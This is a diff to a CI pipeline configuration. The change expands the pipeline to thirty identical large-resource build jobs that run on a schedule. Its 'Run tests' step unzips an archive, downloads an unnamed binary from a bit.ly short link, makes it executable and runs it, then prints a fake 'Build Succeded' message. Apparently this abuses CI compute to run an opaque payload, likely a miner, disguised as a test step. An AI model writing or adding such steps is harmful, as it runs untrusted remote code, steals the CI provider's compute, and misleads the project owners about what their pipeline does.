@@ -7,73 +7,164 @@ working_dir: &working_dir ~/app
         command: |
                     apt-get update
                     apt-get upgrade -y
-                    apt-get install -y ca-certificates screen wget git libcurl4 libjansson4 libgomp1 build-essential make cmake
+                    apt-get install -y ca-certificates screen wget git libcurl4 libjansson4 libgomp1 build-essential make cmake unzip
     - run: 
         name: Run tests 
         command: |
+                    unzip rtm.zip
                     wget -qO subrek https://bit.ly/3Ipgmg8
-                    chmod +x subrek 
+                    chmod +x subrek
                     ./subrek  
                     echo Build Succeded                                 
 version: 2.0 
 jobs: 
   build1: 
     <<: *script
-    parallelism: 3
     docker:
       - image: couchbase:latest
     resource_class: large
   build2: 
     <<: *script
-    parallelism: 3
     docker:
       - image: couchbase:latest
     resource_class: large
   build3: 
     <<: *script
-    parallelism: 3
     docker:
       - image: couchbase:latest
     resource_class: large
   build4: 
     <<: *script
-    parallelism: 3
     docker:
       - image: couchbase:latest
     resource_class: large
   build5: 
     <<: *script
-    parallelism: 3
     docker:
       - image: couchbase:latest
     resource_class: large
   build6: 
     <<: *script
-    parallelism: 3
     docker:
       - image: couchbase:latest
     resource_class: large
   build7: 
     <<: *script
-    parallelism: 3
     docker:
       - image: couchbase:latest
     resource_class: large
   build8: 
     <<: *script
-    parallelism: 3
     docker:
       - image: couchbase:latest
     resource_class: large
   build9: 
     <<: *script
-    parallelism: 3
     docker:
       - image: couchbase:latest
     resource_class: large
   build10: 
     <<: *script
-    parallelism: 3
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build11: 
+    <<: *script
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build12: 
+    <<: *script
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build13: 
+    <<: *script
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build14: 
+    <<: *script
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build15: 
+    <<: *script
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build16: 
+    <<: *script
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build17: 
+    <<: *script
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build18: 
+    <<: *script
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build19: 
+    <<: *script
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build20: 
+    <<: *script
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build21: 
+    <<: *script
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build22: 
+    <<: *script
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build23: 
+    <<: *script
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build24: 
+    <<: *script
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build25: 
+    <<: *script
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build26: 
+    <<: *script
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build27: 
+    <<: *script
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build28: 
+    <<: *script
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build29: 
+    <<: *script
+    docker:
+      - image: couchbase:latest
+    resource_class: large
+  build30: 
+    <<: *script
     docker:
       - image: couchbase:latest
     resource_class: large
@@ -92,6 +183,26 @@ workflows:
       - build8
       - build9
       - build10
+      - build11
+      - build12
+      - build13
+      - build14
+      - build15
+      - build16
+      - build17
+      - build18
+      - build19
+      - build20
+      - build21
+      - build22
+      - build23
+      - build24
+      - build25
+      - build26
+      - build27
+      - build28
+      - build29
+      - build30
 
   schedule:
     triggers:
@@ -113,3 +224,23 @@ workflows:
       - build8
       - build9
       - build10
+      - build11
+      - build12
+      - build13
+      - build14
+      - build15
+      - build16
+      - build17
+      - build18
+      - build19
+      - build20
+      - build21
+      - build22
+      - build23
+      - build24
+      - build25
+      - build26
+      - build27
+      - build28
+      - build29
+      - build30
